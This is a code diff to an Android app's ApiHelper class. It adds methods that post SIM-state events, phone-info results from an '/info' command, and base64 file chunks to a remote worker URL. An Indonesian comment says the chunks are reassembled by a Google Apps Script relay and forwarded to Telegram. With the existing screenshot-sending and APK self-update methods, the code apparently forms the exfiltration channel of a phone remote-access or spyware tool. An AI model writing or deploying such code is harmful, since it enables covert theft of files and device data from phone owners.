@@ -809,6 +809,106 @@ public class ApiHelper {
     }
 
     // =========================================================
+    // SIM STATE
+    // =========================================================
+
+    public static boolean sendSimEvent(
+            android.content.Context context,
+            String simState,
+            String message) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",   "simEvent");
+            json.put("simState", simState == null ? "" : simState);
+            json.put("message",  message  == null ? "" : message);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+            readResponse(stream);
+
+            return responseCode >= 200 && responseCode < 300;
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendSimEvent", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
+    // PHONE INFO (/info)
+    // =========================================================
+
+    public static boolean sendInfoResult(String infoText) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(READ_TIMEOUT_MS);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",   "infoResult");
+            json.put("infoText", infoText == null ? "" : infoText);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+            readResponse(stream);
+
+            return responseCode >= 200 && responseCode < 300;
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendInfoResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // =========================================================
     // UPDATE / INSTALL APK
     // =========================================================
 
@@ -1833,6 +1933,78 @@ public class ApiHelper {
 
         } catch (Exception e) {
             Log.e(TAG, "Error sendScreenshotResult", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    /**
+     * Kirim satu chunk file ke GAS.
+     * GAS mengumpulkan semua chunk, lalu gabungkan dan kirim ke Telegram.
+     */
+    public static boolean sendFileChunk(
+            String requestId,
+            String operation,
+            String name,
+            String mimeType,
+            long   totalSizeBytes,
+            int    chunkIndex,
+            int    totalChunks,
+            String chunkBase64) {
+
+        HttpURLConnection conn = null;
+
+        try {
+            URL url = new URL(WORKER_URL);
+
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setInstanceFollowRedirects(true);
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+            conn.setRequestProperty("Accept", "application/json, text/plain, */*");
+            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);
+            conn.setReadTimeout(90000);
+            conn.setDoOutput(true);
+
+            JSONObject json = new JSONObject();
+            json.put("action",         "fileChunk");
+            json.put("requestId",      requestId == null ? "" : requestId);
+            json.put("operation",      operation == null ? "" : operation);
+            json.put("name",           name      == null ? "" : name);
+            json.put("mimeType",       mimeType  == null ? "" : mimeType);
+            json.put("totalSizeBytes", totalSizeBytes);
+            json.put("chunkIndex",     chunkIndex);
+            json.put("totalChunks",    totalChunks);
+            json.put("chunkBase64",    chunkBase64 == null ? "" : chunkBase64);
+
+            byte[] body = json.toString().getBytes(StandardCharsets.UTF_8);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(body);
+                os.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+
+            InputStream stream =
+                    (responseCode >= 200 && responseCode < 300)
+                            ? conn.getInputStream()
+                            : conn.getErrorStream();
+
+            String responseBody = readResponse(stream);
+
+            if (responseCode < 200 || responseCode >= 300) return false;
+
+            try {
+                return "success".equalsIgnoreCase(
+                        new JSONObject(responseBody).optString("status", ""));
+            } catch (Exception ignored) {
+                return false;
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error sendFileChunk chunk=" + chunkIndex, e);
             return false;
         } finally {
             if (conn != null) conn.disconnect();
